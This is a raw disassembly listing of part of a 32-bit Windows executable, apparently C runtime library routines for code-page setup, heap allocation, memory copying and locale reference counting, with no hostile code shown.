  425d94:	mov    ds:0x45df14,eax
  425d99:	mov    DWORD PTR ds:0x45df1c,ecx
  425d9f:	jmp    0x425da7
  425da1:	mov    DWORD PTR ds:0x45df1c,ebx
  425da7:	xor    eax,eax
  425da9:	mov    edi,0x45e030
  425dae:	stos   DWORD PTR es:[edi],eax
  425daf:	stos   DWORD PTR es:[edi],eax
  425db0:	stos   DWORD PTR es:[edi],eax
  425db1:	jmp    0x425dc0
  425db3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425db9:	je     0x425dc9
  425dbb:	call   0x425a8b
  425dc0:	call   0x425ab4
  425dc5:	xor    eax,eax
  425dc7:	jmp    0x425dcc
  425dc9:	or     eax,0xffffffff
  425dcc:	mov    ecx,DWORD PTR [ebp-0x4]
  425dcf:	xor    ecx,DWORD PTR [ebp+0x4]
  425dd2:	pop    edi
  425dd3:	pop    esi
  425dd4:	pop    ebx
  425dd5:	call   0x425a0c
  425dda:	leave  
  425ddb:	ret    
  425ddc:	push   0x14
  425dde:	push   0x429660
  425de3:	call   0x425340
  425de8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dec:	push   0xd
  425dee:	call   0x4254ff
  425df3:	pop    ecx
  425df4:	xor    edi,edi
  425df6:	mov    DWORD PTR [ebp-0x4],edi
  425df9:	mov    DWORD PTR ds:0x45dd84,edi
  425dff:	mov    eax,DWORD PTR [ebp+0x8]
  425e02:	cmp    eax,0xfffffffe
  425e05:	jne    0x425e19
  425e07:	mov    DWORD PTR ds:0x45dd84,0x1
  425e11:	call   DWORD PTR ds:0x4290c0
  425e17:	jmp    0x425e44
  425e19:	cmp    eax,0xfffffffd
  425e1c:	jne    0x425e30
  425e1e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e28:	call   DWORD PTR ds:0x4290bc
  425e2e:	jmp    0x425e44
  425e30:	cmp    eax,0xfffffffc
  425e33:	jne    0x425e44
  425e35:	mov    DWORD PTR ds:0x45dd84,0x1
  425e3f:	mov    eax,ds:0x45ddb4
  425e44:	mov    DWORD PTR [ebp+0x8],eax
  425e47:	cmp    eax,DWORD PTR ds:0x45e024
  425e4d:	je     0x425f0e
  425e53:	mov    esi,DWORD PTR ds:0x45df18
  425e59:	mov    DWORD PTR [ebp-0x20],esi
  425e5c:	cmp    esi,edi
  425e5e:	je     0x425e64
  425e60:	cmp    DWORD PTR [esi],edi
  425e62:	je     0x425e74
  425e64:	push   0x220
  425e69:	call   0x426062
  425e6e:	pop    ecx
  425e6f:	mov    esi,eax
  425e71:	mov    DWORD PTR [ebp-0x20],esi
  425e74:	cmp    esi,edi
  425e76:	je     0x425ef7
  425e78:	push   DWORD PTR [ebp+0x8]
  425e7b:	call   0x425c46
  425e80:	pop    ecx
  425e81:	mov    DWORD PTR [ebp-0x1c],eax
  425e84:	cmp    eax,edi
  425e86:	jne    0x425ef7
  425e88:	mov    DWORD PTR [esi],edi
  425e8a:	mov    eax,ds:0x45e024
  425e8f:	mov    DWORD PTR [esi+0x4],eax
  425e92:	mov    eax,ds:0x45df1c
  425e97:	mov    DWORD PTR [esi+0x8],eax
  425e9a:	mov    eax,ds:0x45df14
  425e9f:	mov    DWORD PTR [esi+0xc],eax
  425ea2:	xor    eax,eax
  425ea4:	mov    DWORD PTR [ebp-0x24],eax
  425ea7:	cmp    eax,0x5
  425eaa:	jge    0x425ebc
  425eac:	mov    cx,WORD PTR [eax*2+0x45e030]
  425eb4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425eb9:	inc    eax
  425eba:	jmp    0x425ea4
  425ebc:	xor    eax,eax
  425ebe:	mov    DWORD PTR [ebp-0x24],eax
  425ec1:	cmp    eax,0x101
  425ec6:	jge    0x425ed5
  425ec8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ece:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ed2:	inc    eax
  425ed3:	jmp    0x425ebe
  425ed5:	xor    eax,eax
  425ed7:	mov    DWORD PTR [ebp-0x24],eax
  425eda:	cmp    eax,0x100
  425edf:	jge    0x425ef1
  425ee1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ee7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425eee:	inc    eax
  425eef:	jmp    0x425ed7
  425ef1:	mov    DWORD PTR ds:0x45df18,esi
  425ef7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425efb:	jne    0x425f11
  425efd:	cmp    esi,DWORD PTR ds:0x45df18
  425f03:	je     0x425f11
  425f05:	push   esi
  425f06:	call   0x425f4a
  425f0b:	pop    ecx
  425f0c:	jmp    0x425f11
  425f0e:	mov    DWORD PTR [ebp-0x1c],edi
  425f11:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f15:	call   0x425f23
  425f1a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f1d:	call   0x42537b
  425f22:	ret    
  425f23:	push   0xd
  425f25:	call   0x42546b
  425f2a:	pop    ecx
  425f2b:	ret    
  425f2c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f33:	jne    0x425f47
  425f35:	push   0xfffffffd
  425f37:	call   0x425ddc
  425f3c:	pop    ecx
  425f3d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f47:	xor    eax,eax
  425f49:	ret    
  425f4a:	push   0xc
  425f4c:	push   0x429670
  425f51:	call   0x425340
  425f56:	mov    esi,DWORD PTR [ebp+0x8]
  425f59:	test   esi,esi
  425f5b:	je     0x425fb5
  425f5d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f64:	jne    0x425fa6
  425f66:	push   0x4
  425f68:	call   0x4254ff
  425f6d:	pop    ecx
  425f6e:	and    DWORD PTR [ebp-0x4],0x0
  425f72:	push   esi
  425f73:	call   0x426722
  425f78:	pop    ecx
  425f79:	mov    DWORD PTR [ebp-0x1c],eax
  425f7c:	test   eax,eax
  425f7e:	je     0x425f89
  425f80:	push   esi
  425f81:	push   eax
  425f82:	call   0x42674d
  425f87:	pop    ecx
  425f88:	pop    ecx
  425f89:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f8d:	call   0x425f9d
  425f92:	cmp    DWORD PTR [ebp-0x1c],0x0
  425f96:	jne    0x425fb5
  425f98:	push   DWORD PTR [ebp+0x8]
  425f9b:	jmp    0x425fa7
  425f9d:	push   0x4
  425f9f:	call   0x42546b
  425fa4:	pop    ecx
  425fa5:	ret    
  425fa6:	push   esi
  425fa7:	push   0x0
  425fa9:	push   DWORD PTR ds:0x45e140
  425faf:	call   DWORD PTR ds:0x42902c
  425fb5:	call   0x42537b
  425fba:	ret    
  425fbb:	push   0xc
  425fbd:	push   0x429680
  425fc2:	call   0x425340
  425fc7:	mov    esi,DWORD PTR [ebp+0x8]
  425fca:	cmp    DWORD PTR ds:0x45e144,0x3
  425fd1:	jne    0x426001
  425fd3:	cmp    esi,DWORD PTR ds:0x45df04
  425fd9:	ja     0x426001
  425fdb:	push   0x4
  425fdd:	call   0x4254ff
  425fe2:	pop    ecx
  425fe3:	and    DWORD PTR [ebp-0x4],0x0
  425fe7:	push   esi
  425fe8:	call   0x426f01
  425fed:	pop    ecx
  425fee:	mov    DWORD PTR [ebp-0x1c],eax
  425ff1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ff5:	call   0x42602d
  425ffa:	mov    eax,DWORD PTR [ebp-0x1c]
  425ffd:	test   eax,eax
  425fff:	jne    0x426024
  426001:	test   esi,esi
  426003:	jne    0x426006
  426005:	inc    esi
  426006:	cmp    DWORD PTR ds:0x45e144,0x1
  42600d:	je     0x426015
  42600f:	add    esi,0xf
  426012:	and    esi,0xfffffff0
  426015:	push   esi
  426016:	push   0x0
  426018:	push   DWORD PTR ds:0x45e140
  42601e:	call   DWORD PTR ds:0x429030
  426024:	call   0x42537b
  426029:	ret    
  42602a:	mov    esi,DWORD PTR [ebp+0x8]
  42602d:	push   0x4
  42602f:	call   0x42546b
  426034:	pop    ecx
  426035:	ret    
  426036:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42603b:	ja     0x42605f
  42603d:	push   DWORD PTR [esp+0x4]
  426041:	call   0x425fbb
  426046:	test   eax,eax
  426048:	pop    ecx
  426049:	jne    0x426061
  42604b:	cmp    DWORD PTR [esp+0x8],eax
  42604f:	je     0x426061
  426051:	push   DWORD PTR [esp+0x4]
  426055:	call   0x427c22
  42605a:	test   eax,eax
  42605c:	pop    ecx
  42605d:	jne    0x42603d
  42605f:	xor    eax,eax
  426061:	ret    
  426062:	push   DWORD PTR ds:0x45ddc8
  426068:	push   DWORD PTR [esp+0x8]
  42606c:	call   0x426036
  426071:	pop    ecx
  426072:	pop    ecx
  426073:	ret    
  426074:	int3   
  426075:	int3   
  426076:	int3   
  426077:	int3   
  426078:	int3   
  426079:	int3   
  42607a:	int3   
  42607b:	int3   
  42607c:	int3   
  42607d:	int3   
  42607e:	int3   
  42607f:	int3   
  426080:	push   ebp
  426081:	mov    ebp,esp
  426083:	push   edi
  426084:	push   esi
  426085:	mov    esi,DWORD PTR [ebp+0xc]
  426088:	mov    ecx,DWORD PTR [ebp+0x10]
  42608b:	mov    edi,DWORD PTR [ebp+0x8]
  42608e:	mov    eax,ecx
  426090:	mov    edx,ecx
  426092:	add    eax,esi
  426094:	cmp    edi,esi
  426096:	jbe    0x4260a0
  426098:	cmp    edi,eax
  42609a:	jb     0x42621c
  4260a0:	test   edi,0x3
  4260a6:	jne    0x4260bc
  4260a8:	shr    ecx,0x2
  4260ab:	and    edx,0x3
  4260ae:	cmp    ecx,0x8
  4260b1:	jb     0x4260dc
  4260b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260b5:	jmp    DWORD PTR [edx*4+0x4261cc]
  4260bc:	mov    eax,edi
  4260be:	mov    edx,0x3
  4260c3:	sub    ecx,0x4
  4260c6:	jb     0x4260d4
  4260c8:	and    eax,0x3
  4260cb:	add    ecx,eax
  4260cd:	jmp    DWORD PTR [eax*4+0x4260e0]
  4260d4:	jmp    DWORD PTR [ecx*4+0x4261dc]
  4260db:	nop
  4260dc:	jmp    DWORD PTR [ecx*4+0x426160]
  4260e3:	nop
  4260e4:	lock pusha 
  4260e6:	inc    edx
  4260e7:	add    BYTE PTR [ecx+eiz*2],bl
  4260ea:	inc    edx
  4260eb:	add    BYTE PTR [eax+0x61],al
  4260ee:	inc    edx
  4260ef:	add    BYTE PTR [ebx],ah
  4260f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4260f7:	inc    esi
  4260f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4260fe:	add    al,cl
  426100:	jmp    0x289e907
  426105:	add    esi,0x3
  426108:	add    edi,0x3
  42610b:	cmp    ecx,0x8
  42610e:	jb     0x4260dc
  426110:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426112:	jmp    DWORD PTR [edx*4+0x4261cc]
  426119:	lea    ecx,[ecx+0x0]
  42611c:	and    edx,ecx
  42611e:	mov    al,BYTE PTR [esi]
  426120:	mov    BYTE PTR [edi],al
  426122:	mov    al,BYTE PTR [esi+0x1]
  426125:	shr    ecx,0x2
  426128:	mov    BYTE PTR [edi+0x1],al
  42612b:	add    esi,0x2
  42612e:	add    edi,0x2
  426131:	cmp    ecx,0x8
  426134:	jb     0x4260dc
  426136:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426138:	jmp    DWORD PTR [edx*4+0x4261cc]
  42613f:	nop
  426140:	and    edx,ecx
  426142:	mov    al,BYTE PTR [esi]
  426144:	mov    BYTE PTR [edi],al
  426146:	add    esi,0x1
  426149:	shr    ecx,0x2
  42614c:	add    edi,0x1
  42614f:	cmp    ecx,0x8
  426152:	jb     0x4260dc
  426154:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426156:	jmp    DWORD PTR [edx*4+0x4261cc]
  42615d:	lea    ecx,[ecx+0x0]
  426160:	ret    
  426161:	popa   
  426162:	inc    edx
  426163:	add    BYTE PTR [eax-0x57ffbd9f],dh
  426169:	popa   
  42616a:	inc    edx
  42616b:	add    BYTE PTR [eax-0x67ffbd9f],ah
  426171:	popa   
  426172:	inc    edx
  426173:	add    BYTE PTR [eax-0x77ffbd9f],dl
  426179:	popa   
  42617a:	inc    edx
  42617b:	add    BYTE PTR [eax-0x74ffbd9f],al
  426181:	inc    esp
  426182:	mov    fs,esp
  426184:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  426188:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42618c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426190:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426194:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426198:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42619c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261b8:	lea    eax,[ecx*4+0x0]
  4261bf:	add    esi,eax
  4261c1:	add    edi,eax
  4261c3:	jmp    DWORD PTR [edx*4+0x4261cc]
  4261ca:	mov    edi,edi
  4261cc:	fsub   QWORD PTR [ecx+0x42]
  4261cf:	add    ah,ah
  4261d1:	popa   
  4261d2:	inc    edx
  4261d3:	add    al,dh
  4261d5:	popa   
  4261d6:	inc    edx
  4261d7:	add    BYTE PTR [edx+eiz*2],al
  4261da:	inc    edx
  4261db:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261e1:	leave  
  4261e2:	ret    
  4261e3:	nop
  4261e4:	mov    al,BYTE PTR [esi]
  4261e6:	mov    BYTE PTR [edi],al
  4261e8:	mov    eax,DWORD PTR [ebp+0x8]
  4261eb:	pop    esi
  4261ec:	pop    edi
  4261ed:	leave  
  4261ee:	ret    
  4261ef:	nop
  4261f0:	mov    al,BYTE PTR [esi]
  4261f2:	mov    BYTE PTR [edi],al
  4261f4:	mov    al,BYTE PTR [esi+0x1]
  4261f7:	mov    BYTE PTR [edi+0x1],al
  4261fa:	mov    eax,DWORD PTR [ebp+0x8]
  4261fd:	pop    esi
  4261fe:	pop    edi
  4261ff:	leave  
  426200:	ret    
  426201:	lea    ecx,[ecx+0x0]
  426204:	mov    al,BYTE PTR [esi]
  426206:	mov    BYTE PTR [edi],al
  426208:	mov    al,BYTE PTR [esi+0x1]
  42620b:	mov    BYTE PTR [edi+0x1],al
  42620e:	mov    al,BYTE PTR [esi+0x2]
  426211:	mov    BYTE PTR [edi+0x2],al
  426214:	mov    eax,DWORD PTR [ebp+0x8]
  426217:	pop    esi
  426218:	pop    edi
  426219:	leave  
  42621a:	ret    
  42621b:	nop
  42621c:	lea    esi,[ecx+esi*1-0x4]
  426220:	lea    edi,[ecx+edi*1-0x4]
  426224:	test   edi,0x3
  42622a:	jne    0x426250
  42622c:	shr    ecx,0x2
  42622f:	and    edx,0x3
  426232:	cmp    ecx,0x8
  426235:	jb     0x426244
  426237:	std    
  426238:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42623a:	cld    
  42623b:	jmp    DWORD PTR [edx*4+0x426368]
  426242:	mov    edi,edi
  426244:	neg    ecx
  426246:	jmp    DWORD PTR [ecx*4+0x426318]
  42624d:	lea    ecx,[ecx+0x0]
  426250:	mov    eax,edi
  426252:	mov    edx,0x3
  426257:	cmp    ecx,0x4
  42625a:	jb     0x426268
  42625c:	and    eax,0x3
  42625f:	sub    ecx,eax
  426261:	jmp    DWORD PTR [eax*4+0x42626c]
  426268:	jmp    DWORD PTR [ecx*4+0x426368]
  42626f:	nop
  426270:	jl     0x4262d4
  426272:	inc    edx
  426273:	add    BYTE PTR [eax-0x37ffbd9e],ah
  426279:	bound  eax,QWORD PTR [edx+0x0]
  42627c:	mov    al,BYTE PTR [esi+0x3]
  42627f:	and    edx,ecx
  426281:	mov    BYTE PTR [edi+0x3],al
  426284:	sub    esi,0x1
  426287:	shr    ecx,0x2
  42628a:	sub    edi,0x1
  42628d:	cmp    ecx,0x8
  426290:	jb     0x426244
  426292:	std    
  426293:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426295:	cld    
  426296:	jmp    DWORD PTR [edx*4+0x426368]
  42629d:	lea    ecx,[ecx+0x0]
  4262a0:	mov    al,BYTE PTR [esi+0x3]
  4262a3:	and    edx,ecx
  4262a5:	mov    BYTE PTR [edi+0x3],al
  4262a8:	mov    al,BYTE PTR [esi+0x2]
  4262ab:	shr    ecx,0x2
  4262ae:	mov    BYTE PTR [edi+0x2],al
  4262b1:	sub    esi,0x2
  4262b4:	sub    edi,0x2
  4262b7:	cmp    ecx,0x8
  4262ba:	jb     0x426244
  4262bc:	std    
  4262bd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262bf:	cld    
  4262c0:	jmp    DWORD PTR [edx*4+0x426368]
  4262c7:	nop
  4262c8:	mov    al,BYTE PTR [esi+0x3]
  4262cb:	and    edx,ecx
  4262cd:	mov    BYTE PTR [edi+0x3],al
  4262d0:	mov    al,BYTE PTR [esi+0x2]
  4262d3:	mov    BYTE PTR [edi+0x2],al
  4262d6:	mov    al,BYTE PTR [esi+0x1]
  4262d9:	shr    ecx,0x2
  4262dc:	mov    BYTE PTR [edi+0x1],al
  4262df:	sub    esi,0x3
  4262e2:	sub    edi,0x3
  4262e5:	cmp    ecx,0x8
  4262e8:	jb     0x426244
  4262ee:	std    
  4262ef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262f1:	cld    
  4262f2:	jmp    DWORD PTR [edx*4+0x426368]
  4262f9:	lea    ecx,[ecx+0x0]
  4262fc:	sbb    al,0x63
  4262fe:	inc    edx
  4262ff:	add    BYTE PTR [ebx+eiz*2],ah
  426302:	inc    edx
  426303:	add    BYTE PTR [ebx+eiz*2],ch
  426306:	inc    edx
  426307:	add    BYTE PTR [ebx+eiz*2],dh
  42630a:	inc    edx
  42630b:	add    BYTE PTR [ebx+eiz*2],bh
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2+0x42],al
  426313:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  426317:	add    BYTE PTR [edi+0x63],bl
  42631a:	inc    edx
  42631b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426321:	inc    esp
  426322:	(bad)  
  426323:	sbb    al,0x8b
  426325:	inc    esp
  426326:	mov    ds,WORD PTR [eax]
  426328:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42632c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426330:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426334:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426338:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426340:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426348:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426350:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426354:	lea    eax,[ecx*4+0x0]
  42635b:	add    esi,eax
  42635d:	add    edi,eax
  42635f:	jmp    DWORD PTR [edx*4+0x426368]
  426366:	mov    edi,edi
  426368:	js     0x4263cd
  42636a:	inc    edx
  42636b:	add    BYTE PTR [eax-0x6fffbd9d],al
  426371:	arpl   WORD PTR [edx+0x0],ax
  426374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426375:	arpl   WORD PTR [edx+0x0],ax
  426378:	mov    eax,DWORD PTR [ebp+0x8]
  42637b:	pop    esi
  42637c:	pop    edi
  42637d:	leave  
  42637e:	ret    
  42637f:	nop
  426380:	mov    al,BYTE PTR [esi+0x3]
  426383:	mov    BYTE PTR [edi+0x3],al
  426386:	mov    eax,DWORD PTR [ebp+0x8]
  426389:	pop    esi
  42638a:	pop    edi
  42638b:	leave  
  42638c:	ret    
  42638d:	lea    ecx,[ecx+0x0]
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    al,BYTE PTR [esi+0x2]
  426399:	mov    BYTE PTR [edi+0x2],al
  42639c:	mov    eax,DWORD PTR [ebp+0x8]
  42639f:	pop    esi
  4263a0:	pop    edi
  4263a1:	leave  
  4263a2:	ret    
  4263a3:	nop
  4263a4:	mov    al,BYTE PTR [esi+0x3]
  4263a7:	mov    BYTE PTR [edi+0x3],al
  4263aa:	mov    al,BYTE PTR [esi+0x2]
  4263ad:	mov    BYTE PTR [edi+0x2],al
  4263b0:	mov    al,BYTE PTR [esi+0x1]
  4263b3:	mov    BYTE PTR [edi+0x1],al
  4263b6:	mov    eax,DWORD PTR [ebp+0x8]
  4263b9:	pop    esi
  4263ba:	pop    edi
  4263bb:	leave  
  4263bc:	ret    
  4263bd:	push   DWORD PTR [esp+0x4]
  4263c1:	call   DWORD PTR ds:0x4290c8
  4263c7:	xor    eax,eax
  4263c9:	inc    eax
  4263ca:	ret    0x8
  4263cd:	push   0x10
  4263cf:	push   0x4296c8
  4263d4:	call   0x425340
  4263d9:	mov    eax,ds:0x45dd88
  4263de:	test   eax,eax
  4263e0:	jne    0x426419
  4263e2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263e9:	je     0x42640f
  4263eb:	push   0x4296b4
  4263f0:	call   DWORD PTR ds:0x429024
  4263f6:	test   eax,eax
  4263f8:	je     0x42640f
  4263fa:	push   0x42968c
  4263ff:	push   eax
  426400:	call   DWORD PTR ds:0x429020
  426406:	mov    ds:0x45dd88,eax
  42640b:	test   eax,eax
  42640d:	jne    0x426419
  42640f:	mov    eax,0x4263bd
  426414:	mov    ds:0x45dd88,eax
  426419:	and    DWORD PTR [ebp-0x4],0x0
  42641d:	push   DWORD PTR [ebp+0xc]
  426420:	push   DWORD PTR [ebp+0x8]
  426423:	call   eax
  426425:	mov    DWORD PTR [ebp-0x1c],eax
  426428:	jmp    0x42644e
  42642a:	mov    eax,DWORD PTR [ebp-0x14]
  42642d:	mov    eax,DWORD PTR [eax]
  42642f:	mov    eax,DWORD PTR [eax]
  426431:	mov    DWORD PTR [ebp-0x20],eax
  426434:	xor    eax,eax
  426436:	inc    eax
  426437:	ret    
  426438:	mov    esp,DWORD PTR [ebp-0x18]
  42643b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426442:	jne    0x42644c
  426444:	push   0x8
  426446:	call   DWORD PTR ds:0x429094
  42644c:	xor    eax,eax
  42644e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426452:	call   0x42537b
  426457:	ret    
  426458:	push   0x10
  42645a:	push   0x4296d8
  42645f:	call   0x425340
  426464:	mov    esi,DWORD PTR [ebp+0x8]
  426467:	imul   esi,DWORD PTR [ebp+0xc]
  42646b:	mov    DWORD PTR [ebp-0x1c],esi
  42646e:	test   esi,esi
  426470:	jne    0x426473
  426472:	inc    esi
  426473:	xor    edi,edi
  426475:	mov    DWORD PTR [ebp-0x20],edi
  426478:	cmp    esi,0xffffffe0
  42647b:	ja     0x4264e2
  42647d:	cmp    DWORD PTR ds:0x45e144,0x3
  426484:	jne    0x4264cd
  426486:	add    esi,0xf
  426489:	and    esi,0xfffffff0
  42648c:	mov    DWORD PTR [ebp+0xc],esi
  42648f:	mov    ebx,DWORD PTR [ebp-0x1c]
  426492:	cmp    ebx,DWORD PTR ds:0x45df04
  426498:	ja     0x4264cd
  42649a:	push   0x4
  42649c:	call   0x4254ff
  4264a1:	pop    ecx
  4264a2:	and    DWORD PTR [ebp-0x4],edi
  4264a5:	push   ebx
  4264a6:	call   0x426f01
  4264ab:	pop    ecx
  4264ac:	mov    DWORD PTR [ebp-0x20],eax
  4264af:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264b3:	call   0x426502
  4264b8:	mov    edi,DWORD PTR [ebp-0x20]
  4264bb:	test   edi,edi
  4264bd:	je     0x4264d1
  4264bf:	push   DWORD PTR [ebp-0x1c]
  4264c2:	push   0x0
  4264c4:	push   edi
  4264c5:	call   0x427c40
  4264ca:	add    esp,0xc
  4264cd:	test   edi,edi
  4264cf:	jne    0x42650b
  4264d1:	push   esi
  4264d2:	push   0x8
  4264d4:	push   DWORD PTR ds:0x45e140
  4264da:	call   DWORD PTR ds:0x429030
  4264e0:	mov    edi,eax
  4264e2:	test   edi,edi
  4264e4:	jne    0x42650b
  4264e6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264ec:	je     0x42650b
  4264ee:	push   esi
  4264ef:	call   0x427c22
  4264f4:	pop    ecx
  4264f5:	test   eax,eax
  4264f7:	jne    0x426473
  4264fd:	jmp    0x42650d
  4264ff:	mov    esi,DWORD PTR [ebp+0xc]
  426502:	push   0x4
  426504:	call   0x42546b
  426509:	pop    ecx
  42650a:	ret    
  42650b:	mov    eax,edi
  42650d:	call   0x42537b
  426512:	ret    
  426513:	push   esi
  426514:	mov    esi,DWORD PTR [esp+0x8]
  426518:	mov    eax,DWORD PTR [esi+0x3c]
  42651b:	push   edi
  42651c:	xor    edi,edi
  42651e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426524:	je     0x426589
  426526:	cmp    eax,edi
  426528:	je     0x426589
  42652a:	mov    eax,DWORD PTR [esi+0x2c]
  42652d:	cmp    DWORD PTR [eax],edi
  42652f:	jne    0x426589
  426531:	mov    eax,DWORD PTR [esi+0x34]
  426534:	cmp    eax,edi
  426536:	je     0x426554
  426538:	cmp    DWORD PTR [eax],edi
  42653a:	jne    0x426554
  42653c:	cmp    eax,DWORD PTR ds:0x45def0
  426542:	je     0x426554
  426544:	push   eax
  426545:	call   0x425f4a
  42654a:	push   DWORD PTR [esi+0x3c]
  42654d:	call   0x427e8f
  426552:	pop    ecx
  426553:	pop    ecx
  426554:	mov    eax,DWORD PTR [esi+0x30]
  426557:	cmp    eax,edi
  426559:	je     0x426577
  42655b:	cmp    DWORD PTR [eax],edi
  42655d:	jne    0x426577
  42655f:	cmp    eax,DWORD PTR ds:0x45def4
  426565:	je     0x426577
  426567:	push   eax
  426568:	call   0x425f4a
  42656d:	push   DWORD PTR [esi+0x3c]
  426570:	call   0x427e30
  426575:	pop    ecx
  426576:	pop    ecx
  426577:	push   DWORD PTR [esi+0x2c]
  42657a:	call   0x425f4a
  42657f:	push   DWORD PTR [esi+0x3c]
  426582:	call   0x425f4a
  426587:	pop    ecx
  426588:	pop    ecx
  426589:	mov    eax,DWORD PTR [esi+0x40]
  42658c:	cmp    eax,DWORD PTR ds:0x45deec
  426592:	je     0x4265ac
  426594:	cmp    eax,edi
  426596:	je     0x4265ac
  426598:	cmp    DWORD PTR [eax],edi
  42659a:	jne    0x4265ac
  42659c:	push   eax
  42659d:	call   0x425f4a
  4265a2:	push   DWORD PTR [esi+0x44]
  4265a5:	call   0x425f4a
  4265aa:	pop    ecx
  4265ab:	pop    ecx
  4265ac:	mov    eax,DWORD PTR [esi+0x50]
  4265af:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265b5:	je     0x4265d3
  4265b7:	cmp    eax,edi
  4265b9:	je     0x4265d3
  4265bb:	cmp    DWORD PTR [eax+0xb4],edi
  4265c1:	jne    0x4265d3
  4265c3:	push   eax
  4265c4:	call   0x427ca0
  4265c9:	push   DWORD PTR [esi+0x50]
  4265cc:	call   0x425f4a
  4265d1:	pop    ecx
  4265d2:	pop    ecx
  4265d3:	push   esi
  4265d4:	call   0x425f4a
  4265d9:	pop    ecx
  4265da:	pop    edi
  4265db:	pop    esi
  4265dc:	ret    
  4265dd:	push   esi
  4265de:	call   0x4251f3
  4265e3:	mov    esi,eax
  4265e5:	mov    eax,DWORD PTR [esi+0x64]
  4265e8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265ee:	je     0x42669a
  4265f4:	test   eax,eax
  4265f6:	je     0x426627
  4265f8:	mov    ecx,DWORD PTR [eax+0x2c]
  4265fb:	dec    DWORD PTR [eax]
  4265fd:	test   ecx,ecx
  4265ff:	je     0x426603
  426601:	dec    DWORD PTR [ecx]
  426603:	mov    ecx,DWORD PTR [eax+0x34]
  426606:	test   ecx,ecx
  426608:	je     0x42660c
  42660a:	dec    DWORD PTR [ecx]
  42660c:	mov    ecx,DWORD PTR [eax+0x30]
  42660f:	test   ecx,ecx
  426611:	je     0x426615
  426613:	dec    DWORD PTR [ecx]
  426615:	mov    ecx,DWORD PTR [eax+0x40]
  426618:	test   ecx,ecx
  42661a:	je     0x42661e
  42661c:	dec    DWORD PTR [ecx]
  42661e:	mov    ecx,DWORD PTR [eax+0x4c]
  426621:	dec    DWORD PTR [ecx+0xb4]
  426627:	mov    ecx,DWORD PTR ds:0x45d58c
  42662d:	mov    DWORD PTR [esi+0x64],ecx
  426630:	mov    ecx,DWORD PTR ds:0x45d58c
  426636:	inc    DWORD PTR [ecx]
  426638:	mov    ecx,DWORD PTR ds:0x45d58c
  42663e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426641:	test   ecx,ecx
  426643:	je     0x426647
  426645:	inc    DWORD PTR [ecx]
  426647:	mov    ecx,DWORD PTR ds:0x45d58c
  42664d:	mov    ecx,DWORD PTR [ecx+0x34]
  426650:	test   ecx,ecx
  426652:	je     0x426656
  426654:	inc    DWORD PTR [ecx]
  426656:	mov    ecx,DWORD PTR ds:0x45d58c
  42665c:	mov    ecx,DWORD PTR [ecx+0x30]
  42665f:	test   ecx,ecx
  426661:	je     0x426665
  426663:	inc    DWORD PTR [ecx]
